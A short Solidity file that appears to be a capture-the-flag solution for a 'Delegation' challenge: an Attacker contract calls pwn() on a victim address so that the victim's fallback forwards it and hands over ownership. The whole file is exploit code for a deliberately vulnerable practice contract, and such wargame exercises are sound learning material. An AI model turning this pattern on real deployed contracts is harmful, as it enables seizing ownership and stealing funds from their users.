// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {

    function attack(address victim) public {
        (bool success, ) = victim.call(abi.encodeWithSignature("pwn()"));
        require(success, "call not successful");
    }
}

interface Delegation {
    function pwn() external;
}